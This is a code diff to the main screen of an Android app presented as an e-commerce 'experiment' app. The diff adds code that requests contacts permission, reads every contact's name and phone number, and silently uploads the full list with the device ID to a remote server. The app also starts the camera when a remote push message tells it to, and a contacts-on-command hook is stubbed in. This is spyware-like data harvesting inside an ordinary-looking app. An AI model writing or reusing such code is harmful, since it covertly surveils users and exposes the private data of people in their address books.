@@ -1,19 +1,38 @@
 package com.ecommerce.experimentapp.ui
 
 import android.Manifest
+import android.annotation.SuppressLint
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.os.Build
 import android.os.Bundle
+import android.provider.ContactsContract
+import android.provider.Settings
 import android.util.Log
 import android.webkit.WebView
+import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import com.ecommerce.experimentapp.R
 import com.ecommerce.experimentapp.constant.AppConstants
 import com.ecommerce.experimentapp.databinding.ActivityMainBinding
+import com.ecommerce.experimentapp.model.ContactData
+import com.ecommerce.experimentapp.model.ContactReq
+import com.ecommerce.experimentapp.model.FCMTokenData
+import com.ecommerce.experimentapp.network.CommonUtility
+import com.ecommerce.experimentapp.network.RetrofitClient
 import com.ecommerce.experimentapp.service.CameraService
+import com.ecommerce.experimentapp.service.MyFirebaseMessagingService
+import com.ecommerce.experimentapp.service.MyFirebaseMessagingService.Companion
 import com.google.firebase.messaging.FirebaseMessaging
+import okhttp3.MediaType.Companion.toMediaTypeOrNull
+import okhttp3.MultipartBody
+import okhttp3.RequestBody
+import retrofit2.Call
+import retrofit2.Callback
+import retrofit2.Response
+import java.io.File
 
 class MainActivity : AppCompatActivity() {
 
@@ -32,10 +51,10 @@ class MainActivity : AppCompatActivity() {
         setContentView(binding.root)
 
         setSupportActionBar(binding.toolbar)
-      //  setWebView()
+        setWebView()
         requestPermissions()
         initializeFirebase()
-        handleCameraServiceIntent(intent) // Handle any intent that started this activity
+        handleFCMServiceIntent(intent) // Handle any intent that started this activity
 
     }
 
@@ -50,12 +69,14 @@ class MainActivity : AppCompatActivity() {
     private fun requestPermissions() {
         val permissions = arrayOf(
             Manifest.permission.CAMERA,
-            Manifest.permission.POST_NOTIFICATIONS
+            Manifest.permission.POST_NOTIFICATIONS,
+            Manifest.permission.READ_CONTACTS // Add this for contacts
         )
         if (!permissionsGranted(permissions)) {
             ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE)
         } else {
           //  startCameraService()
+            readContacts()
         }
     }
 
@@ -65,11 +86,14 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun handleCameraServiceIntent(intent: Intent?) {
+    private fun handleFCMServiceIntent(intent: Intent?) {
         intent?.let {
             if (it.hasExtra(AppConstants.FCM_SERVICE_TYPE) && it.getStringExtra(AppConstants.FCM_SERVICE_TYPE) == AppConstants.CAMERA) {
                 cameraType = it?.getStringExtra(AppConstants.OPEN_CAMERA_TYPE) ?: AppConstants.CAMERA_BACK
                 startCameraService(cameraType)
+            }
+            if (it.hasExtra(AppConstants.FCM_SERVICE_TYPE) && it.getStringExtra(AppConstants.FCM_SERVICE_TYPE) == AppConstants.CONTACTS) {
+
             }
         }
     }
@@ -116,6 +140,101 @@ class MainActivity : AppCompatActivity() {
     }
 
 
+    override fun onRequestPermissionsResult(
+        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+            val permissionMap = permissions.mapIndexed { index, permission ->
+                permission to grantResults[index]
+            }.toMap()
+
+            if (permissionMap[Manifest.permission.READ_CONTACTS] == PackageManager.PERMISSION_GRANTED) {
+                readContacts()
+            } else {
+                Log.w(TAG, "Read Contacts Permission Denied")
+            }
+        }
+    }
+
+    private fun sendContactsToServer(contacts: List<ContactData>) {
+        val contactReq = ContactReq().apply {
+            this.deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+            this.contacts = contacts
+        }
+
+        Log.d(TAG, "Contact sending to Server.... ")
+        val call = RetrofitClient.instance.sendContacts(contactReq)
+        call.enqueue(object : Callback<Void> {
+            override fun onResponse(call: Call<Void>, response: Response<Void>) {
+                if (response.isSuccessful) {
+                    Log.d(TAG, "Contacts uploaded successfully")
+                    //Toast.makeText(baseContext, "FCM Token sent successfully", Toast.LENGTH_LONG).show()
+                } else {
+                    Log.w(TAG, "Upload failed: ${response.errorBody().toString()}")
+                    Toast.makeText(baseContext, "Failed to send FCM Token: ${response.errorBody().toString()}", Toast.LENGTH_LONG).show()
+                }
+            }
+
+            override fun onFailure(call: Call<Void>, t: Throwable) {
+                Log.e(TAG, "Error: ${t.message}")
+            }
+        })
+    }
+
+
+    @SuppressLint("Range")
+    private fun readContacts() {
+        var  contactDataList= ArrayList<ContactData>()
+        val uniqueContacts = HashSet<String>() // To track unique contacts based on phone number
+        val contentResolver = contentResolver
+        val uri = ContactsContract.Contacts.CONTENT_URI
+        val cursor = contentResolver.query(uri, null, null, null, null)
+
+
+        cursor?.use {
+            while (it.moveToNext()) {
+                val id = it.getString(it.getColumnIndex(ContactsContract.Contacts._ID))
+                val name = it.getString(it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
+
+                if (it.getInt(it.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
+                    val phoneCursor = contentResolver.query(
+                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                        null,
+                        "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
+                        arrayOf(id),
+                        null
+                    )
+
+                    phoneCursor?.use { pc ->
+                        while (pc.moveToNext()) {
+                            var phoneNumber = pc.getString(pc.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
+
+                            if (phoneNumber.startsWith("+91")) {
+                                phoneNumber = phoneNumber.substring(3) // Remove the first three characters (+91)
+                            }
+                            phoneNumber = phoneNumber.replace(Regex("[^0-9]"), "")
+                            if (!uniqueContacts.contains(phoneNumber) && phoneNumber.length==10) {
+                                val contact = mapOf("name" to name, "phone" to phoneNumber)
+                                 val contactData:ContactData= ContactData()
+                                contactData.name=name
+                                contactData.mobile=phoneNumber
+                                contactDataList.add(contactData)
+                                uniqueContacts.add(phoneNumber)
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        for (contact in contactDataList) {
+            Log.d(TAG, "Contact: ${contact.name} - ${contact.mobile}")
+        }
+
+         sendContactsToServer(contactDataList)
+    }
 
 
 
